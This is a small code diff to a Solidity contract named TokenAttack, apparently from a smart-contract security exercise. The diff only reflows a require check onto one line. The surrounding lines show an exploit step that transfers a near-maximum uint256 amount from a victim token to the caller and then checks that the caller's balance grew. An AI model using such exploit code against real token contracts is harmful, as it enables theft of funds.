@@ -16,9 +16,6 @@ contract TokenAttack {
 
         victimToken.transfer(msg.sender, type(uint256).max - balance - 1);
 
-        require(
-            balance < victimToken.balanceOf(msg.sender),
-            "Token: Attack failed"
-        );
+        require(balance < victimToken.balanceOf(msg.sender), "Token: Attack failed");
     }
 }
